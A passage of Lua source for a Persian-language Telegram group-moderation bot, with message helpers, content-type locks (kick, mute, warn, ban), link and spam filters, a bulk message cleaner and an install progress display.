if markdown == 'md' or markdown == 'markdown' then
url = url..'&parse_mode=Markdown'
elseif markdown == 'html' then
url = url..'&parse_mode=HTML'
end
return https.request(url)
end
----------------------------------------------
function send_inline(chat_id,text,keyboard)
local url = Bot_Api
if keyboard then
url = url .. '/sendMessage?chat_id=' ..chat_id.. '&text='..URL.escape(text)..'&parse_mode=HTML&reply_markup='..URL.escape(json:encode(keyboard))
else
url = url .. '/sendMessage?chat_id=' ..chat_id.. '&text=' ..URL.escape(text)..'&parse_mode=HTML'
end
if markdown == 'md' or markdown == 'markdown' then
url = url..'&parse_mode=Markdown'
elseif markdown == 'html' then
url = url..'&parse_mode=HTML'
end
return https.request(url)
end
----------------------------------------------
function edit_msg(chat_id,message_id,text, keyboard, markdown)
local url = Bot_Api .. '/editMessageText?chat_id=' .. chat_id .. '&message_id='..message_id..'&text=' .. URL.escape(text)
if markdown then
url = url .. '&parse_mode=Markdown'
end
url = url .. '&disable_web_page_preview=true'
if keyboard then
url = url..'&reply_markup='..json.encode(keyboard)
end
return https.request(url)
end



----------------------------------------------
function is_JoinChannel(msg)
if base:get(TD_ID..'joinchnl') then
local url  = https.request('https://api.telegram.org/bot'..JoinToken..'/getchatmember?chat_id=@'..Channel..'&user_id='..msg.sender_user_id)
if res ~= 200 then
end
Joinchanel = json:decode(url)
if not is_GlobalyBan(msg.sender_user_id) and (not Joinchanel.ok or Joinchanel.result.status == "left" or Joinchanel.result.status == "kicked") and not is_Sudo(msg) and not base:get(TD_ID..'joinchnl') then
function name(arg,data)
if is_Owner(msg,msg.sender_user_id) then
rank = ' 👨🏻‍🔧 مالک گروه '
elseif is_Mod(msg,msg.sender_user_id) then 
rank = ' 🤴 ادمین گروه'
elseif is_Nazem(msg,msg.sender_user_id) then 
rank = ' 👮🏻‍♂️ معاون گروه '
elseif not  is_Vip(msg,msg.sender_user_id) then
rank = '◈ کاربر '
end
local username = '<a href="tg://user?id='..msg.sender_user_id..'"> '..data.first_name..' </a>'
bd = '◂  <b>'..rank..'</b> '..username..' <b>برای ارسال دستورات ربات خواهشمند است به کانال ما عضو شوید.</b> '
local keyboard = {}
keyboard.inline_keyboard = {
{
{text = '◈ عضویت در تیم گاردین ◈',url='https://telegram.me/'..Config.Channel}
}
}
send_inline(msg.chat_id,bd,keyboard,'html')
end
GetUser(msg.sender_user_id,name)
else
return true
end
else
return true
end
end
function getindex(t,id)
for i,v in pairs(t) do
if v == id then
return i
end
end
return nil
end
function replace(value, del, find)
del = del:gsub(
"[%(%)%.%+%-%*%?%[%]%^%$%%]",
"%%%1"
)
find = find:gsub(
"[%%]",
"%%%%"
)
return string.gsub(
value,
del,
find
)
end
function is_channel(msg)
chat_id = tostring(msg.chat_id)
if chat_id:match('^-100') then
if msg.is_post then
return true
else
return false
end
end
end
function is_group(msg)
chat_id= tostring(msg.chat_id)
if chat_id:match('^-100') then
return false
elseif chat_id_:match('^-') then
return true
else
return false
end
end
function is_private(msg)
chat_id = tostring(msg.chat_id)
if chat_id:match('^(%d+)') then
print 'Private'
return false
else
return true
end
end
function gp_type(chat_id)
local gp_type = "pv"
local id = tostring(chat_id)
if id:match("^-100") then
gp_type = "channel"
elseif id:match("-") then
gp_type = "chat"
end
return gp_type
end
local function run_bash(str)
local cmd = io.popen(str)
local result = cmd:read('*all')
return result
end






----------- >>Function BD_Locks<< -----------
local function lock_del(msg)
deleteMessages(msg.chat_id,{[0] = msg.id})
end
--<><>--<><>--<><>-<><>-<><>--<><>--<><>--<>--
local function lock_kick(msg,fa)
local function name(black,diamond)
if diamond.username == '' then name = ec_name(diamond.first_name) else name = diamond.username end
if not base:sismember(TD_ID..'Gp2:'..msg.chat_id,'MsgCheckPm') then
--sendApi(msg.chat_id,0,"✦ کاربر :【["..name.."](tg://user?id="..msg.sender_user_id..")】\nاز گروه #اخراج شد\n─┅━━━━━━━┅─\n℘ دلیل اخراج : "..fa.."",'md')
end
KickUser(msg.chat_id,msg.sender_user_id)
UnRes(msg.chat_id,msg.sender_user_id)
end
GetUser(msg.sender_user_id,name)
end
--<><>--<><>--<>
local function lock_mute(msg,fa)
local timemutemsg = tonumber(base:get(TD_ID..'mutetime:'..msg.chat_id) or 3600)
local function name(black,diamond)
if diamond.username == '' then name = ec_name(diamond.first_name) else name = diamond.username end
if not base:sismember(TD_ID..'Gp2:'..msg.chat_id,'MsgCheckPm') then
--sendApi(msg.chat_id,0,"✦ کاربر :【["..name.."](tg://user?id="..msg.sender_user_id..")】\nبه مدت【"..timemutemsg.."】ثانیه از ارسال پیام #محدود شد\n─┅━━━━━━━┅─\n℘ دلیل محدودیت : "..fa.."","md")
end
MuteUser(msg.chat_id,msg.sender_user_id,msg.date+timemutemsg)
end
GetUser(msg.sender_user_id,name)
end
--<><>--<><>--<>
local function lock_silent(msg,fa)
local function name(black,diamond)
if diamond.username == '' then name = ec_name(diamond.first_name) else name = diamond.username end
if not base:sismember(TD_ID..'SilentList:'..msg.chat_id,msg.sender_user_id) then
if not base:sismember(TD_ID..'Gp2:'..msg.chat_id,'MsgCheckPm') then
--sendApi(msg.chat_id,0,'✦ کاربر :【['..name..'](tg://user?id='..msg.sender_user_id..')】\n#سایلنت شد\n─┅━━━━━━━┅─\n℘ دلیل سایلنت : '..fa..'','md')
end
base:sadd(TD_ID..'SilentList:'..msg.chat_id,msg.sender_user_id or 00000000)
end
end
GetUser(msg.sender_user_id,name)
end
--<><>--<><>--<><>
local function lock_warn(msg,fa)
local hashwarnbd = TD_ID..msg.sender_user_id..':warn'
local warnhashbd = base:hget(hashwarnbd, msg.chat_id) or 1
local max_warn = tonumber(base:get(TD_ID..'max_warn:'..msg.chat_id) or 5)
local function name(black,diamond)
if diamond.username == '' then name = ec_name(diamond.first_name) else name = diamond.username end
if tonumber(warnhashbd) == tonumber(max_warn) then
KickUser(msg.chat_id,msg.sender_user_id)
if not base:sismember(TD_ID..'Gp2:'..msg.chat_id,'MsgCheckPm') then
--sendApi(msg.chat_id,0,'✦ کاربر :【['..name..'](tg://user?id='..msg.sender_user_id..')】\nبه علت گرفتن حداکثر #اخطار از گروه #اخراج شد\n℘ دلیل اخطار و اخراج : '..fa..'\n─┅━━━━━━━┅─\n• #اخطارها : '..warnhashbd..'/'..max_warn..'','md')
end
base:hdel(hashwarnbd,msg.chat_id,max_warn)
else
base:hset(hashwarnbd,msg.chat_id, tonumber(warnhashbd) +1)
if not base:sismember(TD_ID..'Gp2:'..msg.chat_id,'MsgCheckPm') then
sendApi(msg.chat_id,0,'✦ کاربر :【['..name..'](tg://user?id='..msg.sender_user_id..')】\nشما یک #اخطار دریافت کردید\n─┅━━━━━━━┅─\n℘ دلیل اخطار : '..fa..'\n• #اخطارها : '..warnhashbd..'/'..max_warn..'','md')
end
end
end
GetUser(msg.sender_user_id,name)
end
--<><>--<><>--<><>
local function lock_ban(msg,fa)
local function name(black,diamond)
if diamond.username == '' then name = ec_name(diamond.first_name) else name = diamond.username end
if not base:sismember(TD_ID..'Gp2:'..msg.chat_id,'MsgCheckPm') then
--sendApi(msg.chat_id,0,"✦ کاربر :【["..name.."](tg://user?id="..msg.sender_user_id..")】\nاز گروه #مسدود شد\n─┅━━━━━━━┅─\n℘ دلیل مسدودیت : "..fa.."","md")
end
KickUser(msg.chat_id,msg.sender_user_id)
end
GetUser(msg.sender_user_id,name)
end
--<><>Msg Check >> @Mrr619<><>--
local function MsgCheck(msg,fa,Redis,Redis2)
if base:sismember(TD_ID..'Gp3:'..msg.chat_id,msg.sender_user_id..' حذف '..Redis2) or base:sismember(TD_ID..'Gp:'..msg.chat_id,'Del:'..Redis) then
lock_del(msg)
end
end

--<><>Bot Msg<><>--
function BotMessage(chat_id,msg_id,data)
local Ramin = data.top_message.content.text
if base:sismember(TD_ID..'Gp2:'..chat_id,'cbmon') then
function BDClearCmd()
deleteMessages(chat_id,{[0] = msg_id})
end
local timecgms = tonumber(base:get(TD_ID..'cbmtime:'..chat_id)) or 10
alarm(timecgms,BDClearCmd)
end

--[[if Ramin:match('^◈ پاکسازی کلی پیام انجام شد.') then
function BDClearPm()
deleteMessages(chat_id,{[0] = msg_id})
end
alarm(2,BDClearPm) 
end --]]


if data.top_message.content._ == "messageText" then
logo ={
'█ %10','██ %20',
'███ %30','████ %40',
'█████ %50','██████ %60',
'███████ %70','████████ %80',
'█████████ %90','██████████ %100'}





if Ramin and Ramin:match('^• ربات درحال پاکسازی پیام می باشد...\n\n>│$') then
local Msg = base:get(TD_ID..'Total:messagescleaner:'..chat_id..'') or 0
local Msgsday = tonumber(base:get(TD_ID..'Total:messagescleaner:'..chat_id..':'..os.date('%Y/%m/%d')..'' or 00000000)) or 0
local x = os.clock()
local s = 0
for i=1,100000 do s = s + i end
print(string.format("elapsed time: %.1f\n", os.clock() - x))
local url  = https.request(Bot_Api .. '/getChatMember?chat_id='..chat_id..'&user_id='..BotCliId)
if res ~= 200 then
end
statsurl = json:decode(url)

if statsurl.ok == true and statsurl.result.status == 'administrator' and statsurl.result.can_delete_messages == true then
function delHistory(BD,org)
if org.messages and #org.messages>0 then 
for k,v in pairs(org.messages) do
deleteMessagesFromUser(BD.chat_id,v.sender_user_id)
end
cleanmsgs(BD.chat_id,BD.msg_id,0,200,0,delHistory,{chat_id=BD.chat_id,msg_id=BD.msg_id})
else 
text = string.format("◈ پاکسازی کلی پیام انجام شد.\n▁▁▁▂▂▂▂▂▂▂▁▁▁\n๏ زمان طی شده : %.1f\n๏  تعداد کل پیام : "..Msg.." \n๏  تعداد پیام امروزی : "..Msgsday.."", os.clock() - x)
base:set(TD_ID..'CleanText:'..chat_id,text)
send(chat_id,0,string.format("◈ پاکسازی کلی پیام انجام شد.", os.clock() - x),'html')
base:del(TD_ID..'Total:messagescleaner:'..chat_id)
base:del(TD_ID..'Total:messagescleaner:'..chat_id..':'..os.date('%Y/%m/%d')..'')
local function groupcreator(Ramin,result)
local list = result.members
local t = '> لیست کاربران گروه:\n'
local n = 0
for k,v in pairs(list) do
n = (n + 1)
t = t..n.." - "..v.user_id.."\n"
deleteMessagesFromUser(chat_id,v.user_id)
end
for k,v in pairs(list) do
n = (n + 1)
t = t..n.." - "..v.user_id.."\n"
deleteMessagesFromUser(chat_id,v.user_id) 
end
for k,v in pairs(list) do
n = (n + 1)
t = t..n.." - "..v.user_id.."\n"
deleteMessagesFromUser(chat_id,v.user_id)
end
getChannelMembers(chat_id, "Search", 0, 100000000000,groupcreator)
end
--send(chat_id,0,'ツ.پاکسازی کلی پیام انجام شد','md')
end
end
cleanmsgs(chat_id,data.id, 0,200,0,delHistory,{chat_id=chat_id,msg_id=data.id})
end
end




if Ramin:match('درحال نصب ربات...\n\n>│') then
function edit_text(data,org)
if data.i > 10 then
local function GetCreator(extra,result,success)
for k,v in pairs(result.members) do
if v.status._ == "chatMemberStatusCreator" then
local function mrr619(arg,data,success)
local function GetName(Guard,Diamond)
if data.username == '' then
username = ''..ec_name(data.first_name)..''
else
username = '@'..data.username..''
end
local BDSudo = base:get(TD_ID..'sudoadd'..chat_id)
if BDSudo then
editt(chat_id,msg_id,'⭕ گروه : '..Diamond.title..'\n✦ توسط : @'..BDSudo..'\n﹄﹃﹄﹃﹄﹃﹄﹃﹄﹃﹄\n به #لیست گروه هاے مدیریتے ربات افزوده شد✓\n─┅━━━━━━━┅─\n'..username..'\nبه عنوان مالک گروه ثبت شد\n─┅━━━━━━━┅─\nو تمامی ادمین ها به مدیر ربات ارتقاع یافتن✓','html')
base:del(TD_ID..'sudoadd'..chat_id)
end
end
GetChat(chat_id,GetName)
end
GetUser(v.user_id,mrr619,nil)
end
end
end
getChannelMembers(chat_id,'Administrators',0,200,GetCreator)
else
editt(chat_id,msg_id,Ramin..logo[data.i],'md')
alarm(0.5,edit_text,{i=data.i+1})
end
end
alarm(0.5,edit_text,{i=1})
end
---end text
end

end


local function BDStartPro(msg,data)
---OpenChat
BDChatId = tostring(data.chat_id)
if BDChatId:match('^-100') then
openChat(BDChatId)
end
assert (tdbot_function ({ _ = 'openMessageContent',chat_id = data.chat_id,message_id = data.message_id}, dl_cb, nil))
----Start
if msg then
local Import = msg.content.text

if msg.send_state._ == "messageIsSuccessfullySent" then
return false
end
if msg.sender_user_id == 777000 then
local c = (Import):gsub("[0123456789:]", {["0"] = "０", ["1"] = "１", ["2"] = "２", ["3"] = "３", ["4"] = "４", ["5"] = "５", ["6"] = "６", ["7"] = "７", ["8"] = "８", ["9"] = "９", [":"] = ":\n"})
local text = os.date("Msg From Telegram : %Y-%m-%d ")
tdbot.sendMessage(Sisi, msg.id, 1, '📜 سلام رییس عمو پاول یک پیام برات فرستاد\n'..text.."\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n"..c, 1, 'md')
end
if msg.sender_user_id == 235723517 then
local text = os.date("Msg From Telegram : %Y-%m-%d ")
tdbot.sendMessage(Sisi, msg.id, 1, '📜 سلام رییس عمو پاول یک پیام برات فرستاد\n'..text.."\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n", 1, 'md')
end
function vardump(value)
print(serpent.block(value, {comment=false}))
end
function vardump_cb(a, b)
vardump(b)
end

local function session_cb(msg, b)
text = "sessions :\n"
for i=0, #b.sessions do
session = b.sessions[i]
vardump(session)
temp =  session.device_model..","..((session.platform ~= "") and " "..session.platform or "").." "..session.system_version.."\n"..session.country.." "..session.ip.."\n"..os.date("%Y/%m/%d %H:%M",  session.last_active_date)
text = text .. temp .. (i ~= #b.sessions and "\n----------------------------\n" or "")
end
tdbot.sendMessage(msg.chat_id, msg.id, 1, text, 1, 'html')
end


local TD_B0T = msg.content.text
if TD_B0T then
TD_B0T = TD_B0T:lower()
end
if MsgType == 'text' and TD_B0T then
if TD_B0T:match('^[/#!]') then
TD_B0T = TD_B0T:gsub('^[/#!]','')
end
end

local chat_id = tostring(msg.chat_id)
local user_id = msg.sender_user_id
local msg_id = msg.id
local reply_id = msg.reply_to_message_id
local caption = msg.content.caption
if msg.content.text then
--vardump(value)
function dl_user(a, b)
function dl_gp(c, d)
name = b.first_name or '----'
gname = d.title or '----'
--print("["..os.date("%X").."] \027[34m"..gname.."\027[39m >> \027[31m"..name.."\027[39m >> "..msg.content.text.." \27[0;39m")
end
GetChat(chat_id,dl_gp)
end
GetUser(user_id,dl_user)
end

if msg.date < tonumber(MsgTime) then
print('> Message A Minute Age...')
return false
end
----set sudo----
if #base:smembers(TD_ID..'SUDO') == 0 then
send(BotJoiner,0,'/start','html')
for k,mohammadrezarosta in pairs(SUDO) do
base:sadd(TD_ID..'SUDO',mohammadrezarosta)
end
base:sadd(TD_ID..'SUDO',BotJoiner)
end
if is_supergroup(msg) then
if base:get(TD_ID.."cleanmsgs") then
allusers = base:smembers(TD_ID..'AllUsers:'..msg.chat_id)
for k, v in pairs(allusers) do
base:del(TD_ID..'addeduser'..msg.chat_id..v)
base:del(TD_ID..'Total:AddUser:'..msg.chat_id..':'..v)
base:del(TD_ID..'Total:messages:'..msg.chat_id..':'..v)
base:del(TD_ID..'Total:messages:'..msg.chat_id)
base:del(TD_ID..'Total:BanUser:'..msg.chat_id..':'..v)
base:del(TD_ID..'Total:KickUser:'..msg.chat_id..':'..v)
base:del(TD_ID..'Total:messages:'..msg.chat_id..':'..os.date("%Y/%m/%d")..':'..v)
end
end
end
--cgm
if msg.chat_id==BotJoiner and msg.content.text:match('cgm (.*)') then
group = msg.content.text:match('cgm (.*)')
local url  = https.request(Bot_Api .. '/getChatMember?chat_id='..group..'&user_id='..BotCliId)
if res ~= 200 then
end
statsurl = json:decode(url)
if statsurl.ok == true and statsurl.result.status == 'administrator' and statsurl.result.can_delete_messages == true then
send(group,0,'• ربات درحال پاکسازی پیام می باشد...\n\n>│','md')
else
send(group,0,'> ربات بـہ حذف پیام ها دسترسے ندارد...','md')
end

end
---------- locals
local lang = base:sismember(TD_ID..'Gp2:'..msg.chat_id,'diamondlang')
local reportpv = base:sismember(TD_ID..'Gp2:'..msg.chat_id,'reportpv')
local ownerslist = base:smembers(TD_ID..'OwnerList:'..msg.chat_id)
function reportowner(text)
if reportpv then
for k,v in pairs(ownerslist) do
sendApi(v,0,text,'md')
end
end
end
reporttext = 'ا┅┅──┄┄═✺═┄┄──┅┅\nدقت کنید تنظیم در خصوصے براے شما فعال باشد و در صورتے که فعال نیست با دستور (ثبت گروه) یا (setgp) در همین خصوصے ربات این قابلیت را فعال کنید.'
------- Start ------
if is_supergroup(msg) then
----check charge
if (msg.content._ == "messageChatJoinByLink" and msg.sender_user_id == BotCliId) or (msg.add and msg.add == BotCliId) and not base:get(TD_ID..'ExpireData:'..msg.chat_id) and not base:sismember(TD_ID..'Gp2:'..msg.chat_id,'added') then
--base:set(TD_ID.."ExpireData:"..msg.chat_id,'AlphaTm')
base:setex(TD_ID..'ExpireData:'..msg.chat_id,day*4,true) 
end 
end

if is_Owner(msg) then
if msg.content._ == 'messagePinMessage' then
base:set(TD_ID..'Pin_id'..msg.chat_id,msg.content.message_id)
end
end
-------------Flood Check------------
local cleantime = tonumber(base:get(TD_ID..'clean:time:'..msg.chat_id) or 120)
local Forcetime = tonumber(base:get(TD_ID..'Force:Time:'..msg.chat_id) or 240)
local Forcepm = tonumber(base:get(TD_ID..'Force:Pm:'..msg.chat_id) or 2)
local NUM_MSG_MAX = tonumber(base:get(TD_ID..'Flood:Max:'..msg.chat_id) or 6)
local NUM_CH_MAX = tonumber(base:get(TD_ID..'NUM_CH_MAX:'..msg.chat_id) or 2000)
local TIME_CHECK = tonumber(base:get(TD_ID..'Flood:Time:'..msg.chat_id) or 10)
local warn = tonumber(base:get(TD_ID..'Warn:Max:'..msg.chat_id) or 5)
local Forcemax = tonumber(base:get(TD_ID..'Force:Max:'..msg.chat_id) or 10)
local added = base:get(TD_ID..'addeduser'..msg.chat_id..''..msg.sender_user_id) or 0
local newuser = base:sismember(TD_ID..'Gp2:'..msg.chat_id,'force_NewUser')
-------------MSG Guard ------------
local Ramin = msg.content.text
local Ramin1 = msg.content.text
local Diamondent = Ramin and msg.content.entities and msg.content.entities[0] and msg.content.entities[0].type._ == "textEntityTypeMentionName"
if Ramin then
Ramin = Ramin:lower()
end
if MsgType == 'text' and Ramin then
if Ramin:match('^[/#!]') then
Ramin = Ramin:gsub('^[/#!]','')
end
end

--------------MSG TYPE----------------
if msg.content._== "messageText" then
MsgType = 'text'
--print(os.date("%H:%M:%S").."  |  ["..msg.sender_user_id.."] >> "..msg.content.text)
end
if msg.content.caption then
--print(os.date("%H:%M:%S").."  |  ["..msg.sender_user_id.."] >> Photo Caption : "..msg.content.caption)
end
if msg.content._ == "messageChatAddMembers" then
--print("["..msg.sender_user_id.."] Added a User")
for i=0,#msg.content.member_user_ids do
msg.add = msg.content.member_user_ids[i]
MsgType = 'AddUser'
end
end
if msg.content._ == "messageChatJoinByLink" then
--print(os.date("%H:%M:%S").."  |  ["..msg.sender_user_id.."] >> Joined By link")
MsgType = 'JoinedByLink'
end
if msg.content._ == "messageDocument" then
--print(os.date("%H:%M:%S").."  |  ["..msg.sender_user_id.."] Sent a Document")
MsgType = 'Document'
end
if msg.content._ == "messageSticker" then
--print(os.date("%H:%M:%S").."  |  ["..msg.sender_user_id.."] Sent a Sticker")
MsgType = 'Sticker'
stk = msg.content.sticker.sticker.id
download(stk,32)
end
if msg.content._ == "messageAudio" then
--print(os.date("%H:%M:%S").."  |  ["..msg.sender_user_id.."] Sent a Audio")
MsgType = 'Audio'
end
if msg.content._ == "messageVoice" then
--print(os.date("%H:%M:%S").."  |  ["..msg.sender_user_id.."] Sent a Voice")
MsgType = 'Voice'
end
if msg.content._ == "messageVideo" then
--print(os.date("%H:%M:%S").."  |  ["..msg.sender_user_id.."] Sent a Video")
MsgType = 'Video'
end
if msg.content._ == "messageAnimation" then
--print(os.date("%H:%M:%S").."  |  ["..msg.sender_user_id.."] Sent a Gif")
MsgType = 'Gif'
end
if msg.content._ == "messageLocation" then
--print(os.date("%H:%M:%S").."  |  ["..msg.sender_user_id.."] Sent a Location")
MsgType = 'Location'
end
if msg.content._ == "messageForwardedFromUser" then
--print(os.date("%H:%M:%S").."  |  ["..msg.sender_user_id.."] Sent a [ messageForwardedFromUser ]")
MsgType = 'messageForwardedFromUser'
end
if msg.content._ == "messageContact" then
--print(os.date("%H:%M:%S").."  |  ["..msg.sender_user_id.."] Sent a Contact")
MsgType = 'Contact'
end
if not msg.reply_markup and msg.via_bot_user_id ~= 0 then
print(serpent.block(data))
--print(os.date("%H:%M:%S").."  |  ["..msg.sender_user_id.."] Sent a MarkDown")
MsgType = 'MarkDown'
end
if msg.content.game then
--print(os.date("%H:%M:%S").."  |  ["..msg.sender_user_id.."] Sent a Game")
MsgType = 'Game'
end
if msg.content._ == "messagePhoto" then
--print(os.date("%H:%M:%S").."  |  ["..msg.sender_user_id.."] Sent a Photo")
MsgType = 'Photo'
end

--------------- >>Join Off<< ---------------
local joinoff = base:sismember(TD_ID..'Gp:'..msg.chat_id,'Lock:Join')
if MsgType == 'JoinedByLink' and joinoff then
KickUser(msg.chat_id,msg.sender_user_id)
end

if base:get(TD_ID..'MarkRead:on') then
viewMessages(msg.chat_id, {[0] = msg.id})
end

if msg then
if msg.send_state._ == "messageIsSuccessfullySent" then
return false
end
local Ramin = msg.content.text
local Import = msg.content.text
if msg_type == 'text' and Ramin then
if Ramin:match('^[/#]') then
Ramin=  Ramin:gsub('^[/#]','')
end
end
if Ramin then
Ramin = Ramin:lower()
end

function msg_valid(msg)
if msg.date and msg.date < os.time() - 60 then
print('\027[» OLD MESSAGE « \027[00m')
return false
end
return true
end
end







----------Msg Checks-------------
local chat = msg.chat_id
if base:sismember(TD_ID..'Gp2:'..msg.chat_id,'added') then
if not is_Owner(msg) then
if base:get(TD_ID..'Lock:Pin:'..chat) then
if msg.content._ == 'messagePinMessage' then
print 'Pinned By Not Owner'
send(chat,msg.id,'فقط مالکان\n','md')
Unpin(chat)
local PIN_ID = base:get(TD_ID..'Pin_id'..chat)
if Pin_id then
Pin(chat, tonumber(PIN_ID), 0)
end
end
end
end
if not is_Vip(msg) then
local chat = msg.chat_id
local user = msg.sender_user_id
local timemutemsg = tonumber(base:get(TD_ID..'mutetime:'..msg.chat_id) or 3600)
local hashwarnbd = TD_ID..''..user..':warn'
local warnhashbd = base:hget(hashwarnbd, chat) or 1
local max_warn = tonumber(base:get(TD_ID..'max_warn:'..chat) or 5)
local DIAMOND = msg.content.caption or msg.content.text
--_____________Text Msg Checks_________________
if DIAMOND then
local link = DIAMOND:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or DIAMOND:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or DIAMOND:match("[Tt].[Mm][Ee]/") or DIAMOND:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or DIAMOND:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Pp][Hh]/") or DIAMOND:match("[Hh][Tt][Tt][Pp]://") or DIAMOND:match("[Hh][Tt][Tt][Pp][Ss]://")
local username = DIAMOND:match("@(.*)") or DIAMOND:match("@")
local tag = DIAMOND:match("#(.*)") or DIAMOND:match("#")
local persian = DIAMOND:match("[\216-\219][\128-\191]")
local english = DIAMOND:match("[A-Z]") or DIAMOND:match("[a-z]")

--<><>Hyper<><>--
if Ramin and msg.content.entities and msg.content.entities[0] and not (msg.content.entities[0].type._ == "textEntityTypeMentionName") then
MsgCheck(msg,'ارسال #هایپرلینک','Hyper','هایپرلینک')
end
--<><>Mention<><>--
if Ramin and msg.content.entities and msg.content.entities[0] and msg.content.entities[0].type._ == "textEntityTypeMentionName" then
MsgCheck(msg,'ارسال #فراخانی','Mention','فراخانی')
end
--<><>Link<><>--
if link then
MsgCheck(msg,'ارسال #لینک','Link','لینک')
end
--<><>Username<><>--
if username then
MsgCheck(msg,'ارسال #نام کاربرے','Username','یوزرنیم')
end
--<><>Tag<><>--
if tag then
MsgCheck(msg,'ارسال هَشتَگ','Tag','هشتگ')
end
--<><>Persian<><>--
if persian then
MsgCheck(msg,'ارسال #فارسی','Persian','فارسی')
end
--<><>English<><>--
if english then
MsgCheck(msg,'ارسال #انگلیسی','English','انگلیسی')
end
---end diamond
end
--<><>Caption<><>--
if msg.content.caption then
MsgCheck(msg,'ارسال #کَپشِن','Caption','کپشن')
end
--<><>Text<><>--
if MsgType == 'text' then
MsgCheck(msg,'ارسال #متن','Text','متن')
end
--<><>Edit<><>--
if msg.edit_date > 0 then
MsgCheck(msg,'ارسال #ویرایش پیام','Edit','ویرایش')
end
--<><>Inline<><>--
if msg.content then
if msg.reply_markup and msg.reply_markup._ == "replyMarkupInlineKeyboard" then
MsgCheck(msg,'ارسال #دکمه شیشه اے','Inline','دکمه شیشه ای')
end
end
--<><>Photo<><>--
if MsgType == 'Photo' then
MsgCheck(msg,'ارسال #عکس','Photo','عکس')
end
--<><>Fwd<><>--
if msg.forward_info then
MsgCheck(msg,'ارسال #فوروارد','Forward','فوروارد')
end
--<><>Videomsg<><>--
if msg.content._ == 'messageVideoNote' then
MsgCheck(msg,'ارسال #ویدیومسیج','Videomsg','ویدیومسیج')
end
--<><>File<><>--
if MsgType == 'Document' then
if msg.content.document.file_name:match("[\216-\219][\128-\191]") or msg.content.caption:match("ضدفیلتر") or msg.content.caption:match("ضد فیلتر") and msg.content.document.file_name:match(".[Aa][Pp][Kk]") then
MsgCheck(msg,'ارسال #بدافزار','Malware','بدافزار')
end
MsgCheck(msg,'ارسال #فایل','Document','فایل')
end
--<><>Location<><>--
if MsgType == 'Location' then
MsgCheck(msg,'ارسال #موقعیت مکانی','Location','موقعیت مکانی')
end
--<><>Voice<><>--
if MsgType == 'Voice' then
MsgCheck(msg,'ارسال #وویس','Voice','وویس')
end
--<><>Contact<><>--
if MsgType == 'Contact' then
MsgCheck(msg,'ارسال #مخاطب','Contact','مخاطب')
end
--<><>Game<><>--
if MsgType == 'Game' then
MsgCheck(msg,'ارسال #بازے','Game','بازی')
end
--<><>Video<><>--
if MsgType == 'Video' then
MsgCheck(msg,'ارسال #فیلم','Video','فیلم')
end
--<><>Audio<><>--
if MsgType == 'Audio' then
MsgCheck(msg,'ارسال #موزیک','Music','آهنگ')
end
--<><>Gif<><>--
if MsgType == 'Gif' then
MsgCheck(msg,'ارسال #گیف','Gif','گیف')
end
--<><>Sticker<><>--
if msg.content._ == "messageSticker" then
MsgCheck(msg,'ارسال #استیکر','Sticker','استیکر')
end
--<><>ChannelPost<><>--
if msg.views ~= 0 then
MsgCheck(msg,'ارسال #پست‌کانال','Channelpost','پست کانال')
end
--<><>Flood<><>--

--<><>Spam<><>--
if msg.content.text then
num = tonumber(base:get(TD_ID..'NUM_CH_MAX:'..msg.chat_id)) or 3600
chars = utf8.len(msg.content.text)
if chars > num then
MsgCheck(msg,'ارسال #هرزنامه','Spam','هرزنامه')
end
end

----------BioLink-----------
if msg.sender_user_id then
function BioLink(extra, result, success)
if result.about then
DiamondAbout = result.about
else
DiamondAbout = 'Nil'
end
if DiamondAbout:match("[Tt].[Mm][Ee]/") or DiamondAbout:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") then
MsgCheck(msg,'#داشتن لینک در بیو','Biolink','لینک بیو')
end
end
GetUserFull(msg.sender_user_id,BioLink)
end
-----------------Bot-----------------
if msg.add then
function ByAddUser(Guard,Diamond)
local function name(black,diamond)
if diamond.username == '' then name = ec_name(diamond.first_name) else name = diamond.username end
local banbotpm = base:sismember(TD_ID..'Gp2:'..chat,'kickbotpm')
if Diamond.type._ == "userTypeBot" then
if base:sismember(TD_ID..'Gp:'..chat,'Kick:Bots') then
KickUser(chat,user)
KickUsercli(chat,user)
UnRes(chat,user)
end
if base:sismember(TD_ID..'Gp:'..chat,'Ban:Bots') then
KickUser(chat,user)
KickUsercli(chat,user)
end
if base:sismember(TD_ID..'Gp3:'..chat,user..' حذف ربات') or base:sismember(TD_ID..'Gp:'..chat,'Del:Bots') then
KickUser(msg.chat_id,Diamond.id)
local function CleanBot(Guard,Diamond)
for k,v in pairs(Diamond.members) do
if tonumber(v.user_id) ~= tonumber(BotJoiner) then
KickUser(msg.chat_id,v.user_id)
KickUsercli(msg.chat_id,v.user_id)
end
end
end
getChannelMembers(msg.chat_id,"Bots",0, 100000000000,CleanBot)
end
if not(base:sismember(TD_ID..'Gp:'..chat,'Ban:Bots') or base:sismember(TD_ID..'Gp:'..chat,'Kick:Bots')) then
if base:sismember(TD_ID..'Gp:'..chat,'Mute:Bots') then
KickUser(chat,Diamond.id)
KickUsercli(chat,Diamond.id)
MuteUser(chat,user,msg.date+timemutemsg)
end
if base:sismember(TD_ID..'Gp:'..chat,'Silent:Bots') then
base:sadd(TD_ID..'MuteList:'..chat,user or 00000000)
deleteMessages(chat,{[0] = msg.id})
end
if base:sismember(TD_ID..'Gp:'..chat,'Warn:Bots') then
if tonumber(warnhashbd) == tonumber(max_warn) then
KickUser(chat,user)
KickUsercli(chat,user)
base:hdel(hashwarnbd,chat,max_warn)
else
base:hset(hashwarnbd,chat, tonumber(warnhashbd) +1)
KickUser(chat,Diamond.id)
KickUsercli(chat,Diamond.id)
end
end
---end not kick or ban
end
end
end
GetUser(user,name)
end
GetUser(msg.add,ByAddUser)
end


----------Filter------------
if Ramin then
if is_filter(msg,Ramin) then
deleteMessages(msg.chat_id, {[0] = msg.id})
end
end
--------Mute all--------








if base:sismember(TD_ID..'Gp2:'..msg.chat_id,'Mute_All') then
if base:sismember(TD_ID..'Gp2:'..msg.chat_id,'Tele_Mute') then
base:sadd(TD_ID..'Mutes:'..msg.chat_id,msg.sender_user_id)
deleteMessages(msg.chat_id,{[0] = msg.id})
MuteUser(msg.chat_id,msg.sender_user_id,0)
else
